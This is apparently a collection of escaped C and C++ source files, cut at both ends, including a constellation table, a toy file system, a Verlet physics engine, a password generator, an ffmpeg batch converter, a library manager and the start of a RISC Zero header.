},\n\t{ Monoceros, \"Mon\", \"Monoceros\", \"Monocerotis\" },\n\t{ Musca, \"Mus\", \"Musca\", \"Muscae\" },\n\t{ Norma, \"Nor\", \"Norma\", \"Normae\" },\n\t{ Octans, \"Oct\", \"Octans\", \"Octantis\" },\n\t{ Ophiuchus, \"Oph\", \"Ophiuchus\", \"Ophiuchii\" },\n\t{ Orion, \"Ori\", \"Orion\", \"Orionis\" },\n\t{ Pavo, \"Pav\", \"Pavo\", \"Pavonis\" },\n\t{ Pegasus, \"Peg\", \"Pegasus\", \"Pegasi\" },\n\t{ Perseus, \"Per\", \"Perseus\", \"Persei\" },\n\t{ Phoenix, \"Phe\", \"Phoenix\", \"Phoenicis\" },\n\t{ Pictor, \"Pic\", \"Pictor\", \"Pictoris\" },\n\t{ Pisces, \"Psc\", \"Pisces\", \"Piscium\" },\n\t{ Piscis_Austrinus, \"PsA\", \"Piscis Austrinus\", \"Piscis Austrini\" },\n\t{ Puppis, \"Pup\", \"Puppis\", \"Puppis\" },\n\t{ Pyxis, \"Pyx\", \"Pyxis\", \"Pyxidis\" },\n\t{ Reticulum, \"Ret\", \"Reticulum\", \"Reticuli\" },\n\t{ Sagitta, \"Sge\", \"Sagitta\", \"Sagittae\" },\n\t{ Sagittarius, \"Sgr\", \"Sagittarius\", \"Sagittarii\" },\n\t{ Scorpius, \"Sco\", \"Scorpius\", \"Scorpii\" },\n\t{ Sculptor, \"Scl\", \"Sculptor\", \"Sculptoris\" },\n\t{ Scutum, \"Sct\", \"Scutum\", \"Scuti\" },\n\t{ Serpens, \"Ser\", \"Serpens\", \"Serpentis\" },\n\t{ Sextans, \"Sex\", \"Sextans\", \"Sextantis\" },\n\t{ Taurus, \"Tau\", \"Taurus\", \"Tauri\" },\n\t{ Telescopium, \"Tel\", \"Telescopium\", \"Telescopii\" },\n\t{ Triangulum, \"Tri\", \"Triangulum\", \"Trianguli\" },\n\t{ Triangulum_Australe, \"TrA\", \"Triangulum Australe\", \"Triangulum Australis\" },\n\t{ Tucana, \"Tuc\", \"Tucana\", \"Tucanae\" },\n\t{ Ursa_Major, \"UMa\", \"Ursa Major\", \"Ursa Majoris\" },\n\t{ Ursa_Minor, \"UMi\", \"Ursa Minor\", \"Ursa Minoris\" },\n\t{ Vela, \"Vel\", \"Vela\", \"Velorum\" },\n\t{ Virgo, \"Vir\", \"Virgo\", \"Virginis\" },\n\t{ Volans, \"Vol\", \"Volans\", \"Volantis\" },\n\t{ Vulpecula, \"Vul\", \"Vulpecula\", \"Vulpeculae\" },\n};\n\nstd::string GetConstellationName(const Constellation constellation)\n{\n\treturn kConstellationData[constellation].name;\n}\n\nstd::string GetConstellationGenitive(const Constellation constellation)\n{\n\treturn kConstellationData[constellation].genitive;\n}\n\nConstellation GetConstellationFromAbbreviation(const std::string& abbreviation)\n{\n\tfor (int i = 0; i < 89; ++i)\n\t{\n\t\tif (kConstellationData[i].abbreviation == abbreviation)\n\t\t{\n\t\t\treturn kConstellationData[i].constellation;\n\t\t}\n\t}\n\n\treturn Unknown;\n}\n\n}\n",
    "#include<stdio.h>\r\n#include<iostream>\r\n#include<stdlib.h>\r\n#include<unistd.h>\r\n#include<string.h>\r\n\r\n#define MAXINODE 50\r\n\r\n#define READ 1\r\n#define WRITE 2\r\n\r\n#define MAXFILESIZE 50\r\n\r\n#define REGULAR 1\r\n#define SPECIAL 2\r\n\r\n#define START 0\r\n#define CURRENT 1\r\n#define END 2\r\n\r\ntypedef struct superblock\r\n{\r\n    int TotalInodes;\r\n    int FreeInode;\r\n}SUPERBLOCK, *PSUPERBLOCK;\r\n\r\ntypedef struct inode\r\n{\r\n    char FileName[30];\r\n    int InodeNumber;\r\n    int FileSize;\r\n    int FileActualSize;\r\n    int FileType;\r\n    char *Buffer;\r\n    int LinkCount;\r\n    int ReferenceCount;\r\n    int Permission;     //1   2   3\r\n    struct inode *next;\r\n}INODE, *PINODE, **PPINODE;\r\n\r\ntypedef struct filetable\r\n{\r\n    int readoffset;\r\n    int writeoffset;\r\n    int count;\r\n    int mode;           //1   2   3\r\n    PINODE ptrinode;\r\n}FILETABLE, *PFILETABLE;\r\n\r\ntypedef struct ufdt\r\n{\r\n    PFILETABLE ptrfiletable;\r\n}UFDT;\r\n\r\nUFDT UFDTArr[50];\r\nSUPERBLOCK SUPERBLOCKobj;\r\nPINODE head = NULL;\r\n\r\nint strlenX(char *str)\r\n{\r\n    int iRet = 0;\r\n\r\n    while(*str != '\\0')\r\n    {\r\n        iRet++;\r\n        str++;\r\n    }\r\n\r\n    return iRet;\r\n}\r\n\r\nvoid man(char *name)\r\n{\r\n    if(name == NULL)\r\n    {\r\n        printf(\"Please Enter Valid Name\\n\");\r\n        return;\r\n    }\r\n\r\n    if(strcmp(name,\"create\") == 0)\r\n    {\r\n        printf(\"Description: Used To Create New Regular File\\n\");\r\n        printf(\"Usage: create file_Name permission\\n\");\r\n    }\r\n    else if(strcmp(name,\"read\") == 0)\r\n    {\r\n        printf(\"Description: Used To Read Data From Regular File\\n\");\r\n        printf(\"Usage: read file_Name number_of_bytes_to_read\\n\");\r\n    }\r\n    else if(strcmp(name,\"write\") == 0)\r\n    {\r\n        printf(\"Description: Used To Write Into Regular File\\n\");\r\n        printf(\"Usage: write file_Name\\nAfter this enter the data that you want to write\\n\");\r\n    }\r\n    else if(strcmp(name,\"ls\") == 0)\r\n    {\r\n        printf(\"Description: Used To List All Information Of File\\n\");\r\n        printf(\"Usage: ls\\n\");\r\n    }\r\n    else if(strcmp(name,\"stat\") == 0)\r\n    {\r\n        printf(\"Description: Used To Display Information Of File\\n\");\r\n        printf(\"Usage: stat file_Name\\n\");\r\n    }\r\n    else if(strcmp(name,\"fstat\") == 0)\r\n    {\r\n        printf(\"Description: Used To Display Information Of File\\n\");\r\n        printf(\"Usage: fstat file_descriptor\\n\");\r\n    }\r\n    else if(strcmp(name,\"truncate\") == 0)\r\n    {\r\n        printf(\"Description: Used To Remove Data From File\\n\");\r\n        printf(\"Usage: truncate file_Name\\n\");\r\n    }\r\n    else if(strcmp(name,\"open\") == 0)\r\n    {\r\n        printf(\"Description: Used To Open Existing File\\n\");\r\n        printf(\"Usage: open file_Name mode\\n\");\r\n    }\r\n    else if(strcmp(name,\"close\") == 0)\r\n    {\r\n        printf(\"Description: Used To Close Open File\\n\");\r\n        printf(\"Usage: close file_Name\\n\");\r\n    }\r\n    else if(strcmp(name,\"closeall\") == 0)\r\n    {\r\n        printf(\"Description: Used To Close All Open Files\\n\");\r\n        printf(\"Usage: closeall\\n\");\r\n    }\r\n    else if(strcmp(name,\"rm\") == 0)\r\n    {\r\n        printf(\"Description: Used To Delete The File\\n\");\r\n        printf(\"Usage: rm file_Name\\n\");\r\n    }\r\n    else if(strcmp(name,\"lseek\") == 0)\r\n    {\r\n        printf(\"Description: Used To Change File Offset\\n\");\r\n        printf(\"Usage: lseek file_name ChangeInOffset StartPoint\\n\");\r\n    }\r\n    else\r\n    {\r\n        printf(\"ERROR: No Manual Entry Available\\n\");\r\n    }\r\n}\r\n\r\nvoid DisplayHelp()\r\n{\r\n    printf(\"create: To Create New File\\n\");\r\n    printf(\"man: To Get Manual Of All Files\\n\");\r\n    printf(\"ls: To List Out All Files\\n\");\r\n    printf(\"clear: To Clear Console\\n\");\r\n    printf(\"open: To Open The File\\n\");\r\n    printf(\"close: To Close The File\\n\");\r\n    printf(\"closeall: To Close All Open Files\\n\");\r\n    printf(\"read: To Read The Content From Files\\n\");\r\n    printf(\"write: To Write Contents Into File\\n\");\r\n    printf(\"exit: To Termnate File System\\n\");\r\n    printf(\"stat: To Display Information Of File Using Name\\n\");\r\n    printf(\"fstat: To Display Information Of File Using File Description\\n\");\r\n    printf(\"truncate: To Remove All Data From File\\n\");\r\n    printf(\"rm: To Delete The File\\n\");\r\n}\r\n\r\nint GetFDFromName(char *name)\r\n{\r\n    int i = 0;\r\n\r\n    while(i < 50)\r\n    {\r\n        if(UFDTArr[i].ptrfiletable != NULL)\r\n        {\r\n            if(strcmp((UFDTArr[i].ptrfiletable->ptrinode->FileName),name) == 0)\r\n            break;\r\n        }\r\n        i++;\r\n    }\r\n\r\n    if(i == 50)\r\n    {\r\n        return -1;\r\n    }\r\n    else\r\n    {\r\n        return i;\r\n    }\r\n    return 0;\r\n}\r\n\r\nPINODE Get_Inode(char *name)\r\n{\r\n    PINODE temp = head;\r\n    int i = 0;\r\n\r\n    if(name == NULL)\r\n    {\r\n        return NULL;\r\n    }\r\n\r\n    while(temp != NULL)\r\n    {\r\n        if(strcmp(name, temp->FileName) == 0)\r\n        {\r\n            break;\r\n        }\r\n        temp = temp->next;\r\n    }\r\n\r\n    return temp;\r\n}\r\n\r\nvoid CreateDILB()\r\n{\r\n    int i = 1;\r\n    PINODE newn = NULL;\r\n    PINODE temp = head;\r\n\r\n    while( i <= MAXINODE)\r\n    {\r\n        newn = (PINODE)mall",
    "#include \"engine.hpp\"\n\n\nbool freeze_frame = false;\n\n// ===== VECTOR - 2D DOUBLE ===== //\nVector2d::Vector2d()\n{\n    x = 0.0;\n    y = 0.0;\n}\n\n// ===== VERLET OBJECT ===== //\nVerletObject::VerletObject() // Default Constructor\n{\n    current_position_ = sf::Vector2f(0.0f, 0.0f);\n    previous_position_ = sf::Vector2f(0.0f, 0.0f);\n    acceleration_ = sf::Vector2f(0.0f, 0.0f);\n    object_.setRadius(10.0f);\n    radius_ = 10.0f;\n    object_.setFillColor(sf::Color::White);\n    object_.setOrigin(10.0f, 10.0f);\n}\nVerletObject::VerletObject(sf::Vector2f initial_position, float radius, sf::Color color, float mass) // Parameterized constructor\n{\n    current_position_ = initial_position;\n    previous_position_ = initial_position;\n    acceleration_ = sf::Vector2f(0.0f, 0.0f);\n    object_.setRadius(radius);\n    radius_ = radius;\n    object_.setFillColor(color);\n    object_.setOrigin(radius, radius);\n    mass_ = mass;\n}\nvoid VerletObject::drawObject(sf::RenderWindow &window) // Draw the object to be rendered onto the screen\n{\n    object_.setPosition(current_position_);\n    window.draw(object_);\n}\nvoid VerletObject::setPosition(sf::Vector2f set_position)\n{\n    current_position_ = set_position;\n    previous_position_ = set_position;\n}\nvoid VerletObject::updatePosition(float dt)\n{\n    const sf::Vector2f velocity = current_position_ - previous_position_; // Determine current velocity\n    previous_position_ = current_position_;\n    current_position_ = previous_position_ + velocity + acceleration_ * dt * dt;\n    acceleration_ = {};\n    // cout << \"CURRENT VELOCITY - \" << sqrt(velocity.x * velocity.x + velocity.y * velocity.y) << endl;\n}\nvoid VerletObject::accelerate(sf::Vector2f acceleration)\n{\n    acceleration_ += acceleration;\n}\n\n// ===== ENGINE ===== //\nvoid Engine::update(float dt, vector<VerletObject> &objects) // Update the engine for the next frame\n{\n    for (VerletObject &obj : objects)\n    {\n        applyGravity(obj);\n        applyElasticConstraints(obj);\n        updatePositions(dt, obj);\n    }\n    applyCollisions(dt, objects);\n}\nvoid Engine::updatePositions(float dt, VerletObject &obj) // Update the position of each Verlet Object\n{\n    obj.updatePosition(dt);\n}\nvoid Engine::applyGravity(VerletObject &obj) // Update the gravity of each Verlet Object\n{\n    obj.accelerate(gravity);\n}\nvoid Engine::setGravity(sf::Vector2f set_gravity)\n{\n    gravity = set_gravity;\n}\nvoid Engine::applyInelasticConstraints(VerletObject &obj) // Constrain each Verlet Object\n{\n    const sf::Vector2f constraint_position = {640.0f, 360.0f};\n    const float constraint_radius = 300.0f;\n\n    const sf::Vector2f to_obj_distance = obj.current_position_ - constraint_position;\n    const float dx = constraint_position.x - obj.current_position_.x;\n    const float dy = constraint_position.y - obj.current_position_.y;\n    const float abs_distance = sqrt(dx * dx + dy * dy);\n\n    if (abs_distance > constraint_radius - obj.radius_)\n    {\n        // Calculate normal position and constraint limits\n        const sf::Vector2f normalize = to_obj_distance / abs_distance;\n        obj.current_position_ = constraint_position + normalize * (constraint_radius - obj.radius_);\n    }\n}\nvoid Engine::applyElasticConstraints(VerletObject &obj)\n{\n    const sf::Vector2f constraint_position = {640.0f, 360.0f};\n    const float constraint_radius = 300.0f;\n\n    const sf::Vector2f to_obj_distance = obj.current_position_ - constraint_position;\n    const float dx = constraint_position.x - obj.current_position_.x;\n    const float dy = constraint_position.y - obj.current_position_.y;\n    const float abs_distance = sqrt(dx * dx + dy * dy);\n\n    if (abs_distance > constraint_radius - obj.radius_)\n    {\n        // Calculate normal position and constraint limits\n        const sf::Vector2f normalize = to_obj_distance / abs_distance;\n        obj.current_position_ = constraint_position + normalize * (constraint_radius - obj.radius_);\n\n        // Reflect velocity for elastic collision\n        sf::Vector2f velocity = obj.current_position_ - obj.previous_position_;\n        float dot_product = velocity.x * normalize.x + velocity.y * normalize.y;\n        sf::Vector2f reflection = velocity - 2.0f * dot_product * normalize;\n        obj.previous_position_ = obj.current_position_ - reflection;\n    }\n}\nvoid Engine::applyCollisions(float dt, vector<VerletObject> &objects)\n{\n    for (VerletObject &obj1 : objects)\n    {\n        for (VerletObject &obj2 : objects)\n        {\n            if (&obj1 != &obj2)\n            {\n                const sf::Vector2f distance = obj1.current_position_ - obj2.current_position_;\n                const float dx = obj1.current_position_.x - obj2.current_position_.x;\n                const float dy = obj1.current_position_.y - obj2.current_position_.y;\n                const float abs_distance = sqrt(dx * dx + dy * dy);\n\n                if (abs_distance < obj1.radius_ + obj2.radius_)\n                {\n                    cout << \"ABS DISTANCE: \" << abs_distance << \" // OBJ RADIUS: \" <<",
    "/* ************************************************************************** */\n/*                                                                            */\n/*                                                        :::      ::::::::   */\n/*   utils.cpp                                          :+:      :+:    :+:   */\n/*                                                    +:+ +:+         +:+     */\n/*   By: nsouchal <nsouchal@student.42.fr>          +#+  +:+       +#+        */\n/*                                                +#+#+#+#+#+   +#+           */\n/*   Created: 2024/07/10 09:17:39 by nsouchal          #+#    #+#             */\n/*   Updated: 2024/07/12 13:57:47 by nsouchal         ###   ########.fr       */\n/*                                                                            */\n/* ************************************************************************** */\n\n#include \"../includes/main_headerfile.hpp\"\n\nstd::string\tft_getline()\n{\n\tstd::string str;\n\n\twhile(42)\n\t{\n\t\tstd::getline(std::cin, str);\n\t\tif (std::cin.eof() == 1)\n\t\t\texit(1);\n\t\telse if (str.empty())\n\t\t\tstd::cout << \"This field can't be empty\" << std::endl << \"Try again : \";\n\t\telse\n\t\t\treturn (str);\n\t}\n\treturn (str);\n}\n\nvoid\tprint_col_title(std::string str)\n{\n\tif (!str.compare(\"index\"))\n\t\tstd::cout << \"*\" << std::setw(10) << str << \"|\";\n\telse if (!str.compare(\"nickname\"))\n\t\tstd::cout << std::setw(10) << str << \"*\" << std::endl;\n\telse\n\t\tstd::cout << std::setw(10) << str << \"|\";\n}",
    "//---------------------------------------------------------------------------\n#include <random>\n\n#include <fmx.h>\n\n#ifdef __ANDROID__\n#include <FMX.Helpers.Android.hpp>\n#include <Androidapi.JNIBridge.hpp>\n#include <Androidapi.JNI.Os.hpp>\n#include <Androidapi.JNI.JavaTypes.hpp>\n#include <Androidapi.JNI.GraphicsContentViewText.hpp>\n#include <Androidapi.JNI.Util.hpp>\n#include <Androidapi.JNI.App.hpp>\n#include <Androidapi.JNI.Embarcadero.hpp>\n#include <Androidapi.Jni.hpp>\n#endif\n\n#pragma hdrstop\n\n#include \"HeaderFooterTemplate.h\"\n//---------------------------------------------------------------------------\n#pragma package(smart_init)\n#pragma resource \"*.fmx\"\n#pragma resource (\"*.SmXhdpiPh.fmx\", _PLAT_ANDROID)\n#pragma resource (\"*.Moto360.fmx\", _PLAT_ANDROID)\n#pragma resource (\"*.SSW3.fmx\", _PLAT_ANDROID)\n#pragma resource (\"*.NmXhdpiPh.fmx\", _PLAT_ANDROID)\n#pragma resource (\"*.Windows.fmx\", _PLAT_MSWINDOWS)\n#pragma resource (\"*.XLgXhdpiTb.fmx\", _PLAT_ANDROID)\n#pragma resource (\"*.LgXhdpiPh.fmx\", _PLAT_ANDROID)\n#pragma resource (\"*.LgXhdpiTb.fmx\", _PLAT_ANDROID)\n\nTHeaderFooterForm *HeaderFooterForm;\n\n//---------------------------------------------------------------------------\nstd::string RandomPassword(uint Chars, std::string pass)\n{\n    if (pass.empty())\n    {\n    \tShowMessage(\"Por favor selecciona que propiedas tiene la contrase\u00f1a.\");\n        return EMPTY;\n    }\n\n    std::string result = EMPTY;\n\n    std::random_device rd;\n    std::mt19937 randNumberGen(rd());\n    \n    while (result.length() < Chars)\n    {\n        result += pass[randNumberGen() % pass.length()];\n    }\n    pass.clear();\n\n    return result;\n}\n//---------------------------------------------------------------------------\n\n__fastcall THeaderFooterForm::THeaderFooterForm(TComponent* Owner)\n\t: TForm(Owner)\n{\n    #ifdef __ANDROID__\n    TAndroidHelper::Activity->getWindow()->setStatusBarColor(COLORBAR);\n    #endif\n}\n//---------------------------------------------------------------------------\n\nvoid __fastcall THeaderFooterForm::btnCopyClick(TObject *Sender)\n{\n    edtPassword->SelectAll();\n    edtPassword->CopyToClipboard();\n}\n//---------------------------------------------------------------------------\n\nvoid __fastcall THeaderFooterForm::btnDeleteClick(TObject *Sender)\n{\n    edtPassword->Text = EMPTY;\n    nbValue->Value = MINVALUE;\n}\n//---------------------------------------------------------------------------\n\nvoid __fastcall THeaderFooterForm::btnGenPasswordClick(TObject *Sender)\n{\n    if (nbValue->Value < MINVALUE)\n    {\n        edtPassword->Text = EMPTY;\n        nbValue->Value = MINVALUE;\n        ShowMessage((UnicodeString)\"No se pueden ingresar valores menores a \" + MINVALUE + (UnicodeString)\".\");\n    }\n    else\n    {\n    \tstd::string tpass = EMPTY;\n\n        //Password options.\n        if (swChars->IsChecked)   { tpass.append(\"!#%+{}[]()<>:=?@\");           }\n        if (swNumbers->IsChecked) { tpass.append(\"1234567890\");                 }\n        if (swUpper->IsChecked)   { tpass.append(\"ABCDEFGHIJKLMNOPQRSTUVWXYZ\"); }\n        if (swLower->IsChecked)   { tpass.append(\"abcdefghijklmnopqrstuvwxyz\"); }\n\n        edtPassword->Text = RandomPassword(nbValue->Value, tpass).c_str();\n    }\n}\n//---------------------------------------------------------------------------\n\n",
    "#include <iostream>\n#include <filesystem>\n#include <cstdlib>\n#include <vector>\n#include <map>\n#include <string>\n#include <stdexcept>\n\nnamespace fs = std::filesystem;\n\n// Function to detect the operating system\nstd::string detectOS() {\n#ifdef _WIN32\n    return \"Windows\";\n#elif __APPLE__\n    return \"macOS\";\n#elif __linux__\n    return \"Linux\";\n#else\n    return \"Unknown\";\n#endif\n}\n\n// Function to get the supported formats based on the OS\nstd::vector<std::pair<std::string, std::string>> getSupportedFormats(const std::string& os) {\n    std::vector<std::pair<std::string, std::string>> formats;\n    if (os == \"Windows\") {\n        formats.push_back({\"ProRes\", \"mov\"});\n        formats.push_back({\"DNxHD\", \"mov\"});\n        formats.push_back({\"DNxHR\", \"mov\"});\n    } else if (os == \"macOS\") {\n        formats.push_back({\"ProRes\", \"mov\"});\n        formats.push_back({\"DNxHD\", \"mov\"});\n        formats.push_back({\"DNxHR\", \"mov\"});\n    } else if (os == \"Linux\") {\n        formats.push_back({\"DNxHR\", \"mov\"});\n    }\n    return formats;\n}\n\nvoid convertToResolveFormat(const fs::path& inputDir, const std::string& format, const std::string& extension, const std::string& os) {\n    // Create the output directory\n    fs::path outputDir = inputDir.string() + \" Resolve Format\";\n    if (!fs::exists(outputDir)) {\n        fs::create_directory(outputDir);\n    }\n\n    // Iterate through all files in the input directory\n    for (const auto& entry : fs::directory_iterator(inputDir)) {\n        if (entry.is_regular_file()) {\n            fs::path inputFile = entry.path();\n            fs::path outputFile = outputDir / inputFile.filename();\n            outputFile.replace_extension(extension);\n\n            std::string command;\n\n            if (os == \"Windows\" || os == \"macOS\") {\n                if (format == \"ProRes\") {\n                    command = \"ffmpeg -i \\\"\" + inputFile.string() + \"\\\" -c:v prores_ks -profile:v 3 -vendor apl0 -c:a pcm_s16le \\\"\" + outputFile.string() + \"\\\"\";\n                } else if (format == \"DNxHD\" || format == \"DNxHR\") {\n                    command = \"ffmpeg -i \\\"\" + inputFile.string() + \"\\\" -c:v dnxhd -profile:v dnxhr_hq -pix_fmt yuv422p -c:a pcm_s16le \\\"\" + outputFile.string() + \"\\\"\";\n                }\n            } else if (os == \"Linux\" && format == \"DNxHR\") {\n                command = \"ffmpeg -i \\\"\" + inputFile.string() + \"\\\" -c:v dnxhd -profile:v dnxhr_hq -pix_fmt yuv422p -c:a pcm_s16le \\\"\" + outputFile.string() + \"\\\"\";\n            }\n\n            std::cout << \"Executing: \" << command << std::endl;\n\n            int result = std::system(command.c_str());\n            if (result != 0) {\n                std::cerr << \"Error converting file: \" << inputFile << std::endl;\n            } else {\n                std::cout << \"Successfully converted: \" << inputFile << \" to \" << outputFile << std::endl;\n            }\n        }\n    }\n}\n\nint main(int argc, char* argv[]) {\n    try {\n        if (argc != 2) {\n            throw std::invalid_argument(\"Usage: \" + std::string(argv[0]) + \" <input_directory>\");\n        }\n\n        fs::path inputDir = argv[1];\n        if (!fs::exists(inputDir)) {\n            throw std::invalid_argument(\"Directory does not exist: \" + inputDir.string());\n        }\n        if (!fs::is_directory(inputDir)) {\n            throw std::invalid_argument(\"Path is not a directory: \" + inputDir.string());\n        }\n\n        std::string os = detectOS();\n        if (os == \"Unknown\") {\n            throw std::runtime_error(\"Unsupported operating system.\");\n        }\n        std::cout << \"Detected OS: \" << os << std::endl;\n\n        std::vector<std::pair<std::string, std::string>> supportedFormats = getSupportedFormats(os);\n        if (supportedFormats.empty()) {\n            throw std::runtime_error(\"No supported formats available for the detected OS.\");\n        }\n        \n        std::cout << \"Supported formats:\" << std::endl;\n        for (size_t i = 0; i < supportedFormats.size(); ++i) {\n            std::cout << i + 1 << \". \" << supportedFormats[i].first << \" (\" << supportedFormats[i].second << \")\" << std::endl;\n        }\n\n        int selectedIndex;\n        std::cout << \"Enter the number of the desired format: \";\n        std::cin >> selectedIndex;\n\n        if (selectedIndex < 1 || selectedIndex > supportedFormats.size()) {\n            throw std::invalid_argument(\"Invalid format selection.\");\n        }\n\n        std::string selectedFormat = supportedFormats[selectedIndex - 1].first;\n        std::string selectedExtension = supportedFormats[selectedIndex - 1].second;\n\n        convertToResolveFormat(inputDir, selectedFormat, selectedExtension, os);\n\n    } catch (const std::invalid_argument& e) {\n        std::cerr << \"Invalid argument: \" << e.what() << std::endl;\n        return 1;\n    } catch (const std::runtime_error& e) {\n        std::cerr << \"Runtime error: \" << e.what() << std::endl;\n        return 1;\n    } catch (const std::exception& e) {\n        std::cerr << \"An error occurred: \" << e.what() << std::endl;\n        return 1;\n    }\n\n ",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"novenoc\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <iostream>\r\n#include <vector>\r\n#include <string>\r\n#include <unordered_map>\r\n\r\nclass Book {\r\npublic:\r\n    std::string title;\r\n    std::string author;\r\n    std::string isbn;\r\n    bool is_available;\r\n\r\n    Book(std::string t, std::string a, std::string i)\r\n        : title(t), author(a), isbn(i), is_available(true) {}\r\n};\r\n\r\nclass Borrower {\r\npublic:\r\n    std::string name;\r\n    std::string id;\r\n\r\n    Borrower(std::string n, std::string i) : name(n), id(i) {}\r\n};\r\n\r\nclass Library {\r\nprivate:\r\n    std::vector<Book> books;\r\n    std::unordered_map<std::string, std::string> borrowed_books; // ISBN -> Borrower ID\r\n    std::unordered_map<std::string, int> fines; // Borrower ID -> Fine amount\r\n\r\npublic:\r\n    void addBook(const Book &book) {\r\n        books.push_back(book);\r\n    }\r\n\r\n    void searchBookByTitle(const std::string &title) {\r\n        for (const auto &book : books) {\r\n            if (book.title == title) {\r\n                std::cout << \"Found Book: \" << book.title << \" by \" << book.author << \" (ISBN: \" << book.isbn << \")\\n\";\r\n                return;\r\n            }\r\n        }\r\n        std::cout << \"Book not found.\\n\";\r\n    }\r\n\r\n    void searchBookByAuthor(const std::string &author) {\r\n        for (const auto &book : books) {\r\n            if (book.author == author) {\r\n                std::cout << \"Found Book: \" << book.title << \" by \" << book.author << \" (ISBN: \" << book.isbn << \")\\n\";\r\n            }\r\n        }\r\n    }\r\n\r\n    void searchBookByISBN(const std::string &isbn) {\r\n        for (const auto &book : books) {\r\n            if (book.isbn == isbn) {\r\n                std::cout << \"Found Book: \" << book.title << \" by \" << book.author << \" (ISBN: \" << book.isbn << \")\\n\";\r\n                return;\r\n            }\r\n        }\r\n        std::cout << \"Book not found.\\n\";\r\n    }\r\n\r\n    void checkoutBook(const std::string &isbn, const Borrower &borrower) {\r\n        for (auto &book : books) {\r\n            if (book.isbn == isbn && book.is_available) {\r\n                book.is_available = false;\r\n                borrowed_books[isbn] = borrower.id;\r\n                std::cout << \"Book checked out successfully.\\n\";\r\n                return;\r\n            }\r\n        }\r\n        std::cout << \"Book not available for checkout.\\n\";\r\n    }\r\n\r\n    void returnBook(const std::string &isbn, const Borrower &borrower) {\r\n        auto it = borrowed_books.find(isbn);\r\n        if (it != borrowed_books.end() && it->second == borrower.id) {\r\n            for (auto &book : books) {\r\n                if (book.isbn == isbn) {\r\n                    book.is_available = true;\r\n                    borrowed_books.erase(isbn);\r\n                    std::cout << \"Book returned successfully.\\n\";\r\n                    return;\r\n                }\r\n            }\r\n        } else {\r\n            std::cout << \"No record of this book being checked out by this borrower.\\n\";\r\n        }\r\n    }\r\n\r\n    void calculateFine(const Borrower &borrower, int overdue_days) {\r\n        int fine_per_day = 2; // Assume fine is $2 per day\r\n        int total_fine = overdue_days * fine_per_day;\r\n        fines[borrower.id] += total_fine;\r\n        std::cout << \"Fine for \" << borrower.name << \": $\" << total_fine << \"\\n\";\r\n    }\r\n};\r\n\r\nint main() {\r\n    Library library;\r\n\r\n    // Add some books to the library\r\n    library.addBook(Book(\"The Great Gatsby\", \"F. Scott Fitzgerald\", \"123456789\"));\r\n    library.addBook(Book(\"1984\", \"George Orwell\", \"987654321\"));\r\n    library.addBook(Book(\"To Kill a Mockingbird\", \"Harper Lee\", \"192837465\"));\r\n\r\n    // Create a borrower\r\n    Borrower borrower(\"John Doe\", \"ID001\");\r\n\r\n    int choice;\r\n    do {\r\n        std::cout << \"\\nLibrary Management System\\n\";\r\n        std::cout << \"1. Search Book by Title\\n\";\r\n        std::cout << \"2. Search Book by Author\\n\";\r\n        std::cout << \"3. Search Book by ISBN\\n\";\r\n        std::cout << \"4. Checkout Book\\n\";\r\n        std::cout << \"5. Return Book\\n\";\r\n        std::cout << \"6. Calculate Fine\\n\";\r\n        std::cout << \"0. Exit\\n\";\r\n        std::cout << \"Enter your choice: \";\r\n        std::cin >> choice;\r\n\r\n        std::string input;\r\n        switch (choice) {\r\n            case 1:\r\n                std::cout << \"Enter book title: \";\r\n                std::cin.ignore(); // to ignore the newline character left in the buffer\r\n                std::getline(std::cin, input);\r\n                library.searchBookByTitle(input);\r\n                break;\r\n            case 2:\r\n                std::cout << \"Enter book author: \";\r\n                std::cin.ignore();\r\n                std::getline(std::cin, input);\r\n                library.searchBookByAuthor(input);\r\n                break;\r\n            case 3:\r\n                std::cout << \"Enter book ISBN: \";\r\n                std::cin.ignore();\r\n                std::getline(std::cin, input);\r\n                library.searchBookByISBN(input);\r\n                break;\r\n            case 4:\r\n                std::cout << \"Enter book ISBN to checkout: \";\r\n                std::cin.ignore();\r\n   ",
    "// Copyright 2024 RISC Zero, Inc.\n//\n// Licensed under the Apache License, Version 2.0 (the \"License\");\n// you may not use this file except in compliance with the License.\n// You may obtain a copy of the License at\n//\n//     http://www.apache.org/licenses/LICENSE-2.0\n//\n// Unless required by applicable law or agreed to in writing, software\n// distributed under the License is distributed on an \"AS IS\" BASIS,\n// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n// See the License for the specific language governing permissions and\n// limitations under the License.\n\n#include \"ffi.h\"\n\n#include \"context.h\"\n#include \"fp.h\"\n#include \"fpext.h\"\n\n#if defined(__clang__)\n#pragma clang diagnostic push\n#pragma clang diagnostic ignored \"-Wmissing-braces\"\n#elif defined(__GNUC__)\n#pragma GCC diagnostic push\n#pragma GCC diagnostic ignored \"-Wmissing-braces\"\n#endif\n\n#include \"vendor/nvtx3/nvtx3.hpp\"\n#include \"vendor/poolstl.hpp\"\n\n#if defined(__clang__)\n#pragma clang diagnostic pop\n#elif defined(__GNUC__)\n#pragma GCC diagnostic pop\n#endif\n\n#include <array>\n#include <cstdint>\n\nusing namespace risc0;\nusing namespace risc0::circuit::rv32im;\n\nconstexpr size_t kStepModeSeqParallel = 0;\nconstexpr size_t kStepModeSeqForward = 1;\nconstexpr size_t kStepModeSeqReverse = 2;\n\n// constexpr size_t kVerifyMemBodyKind = 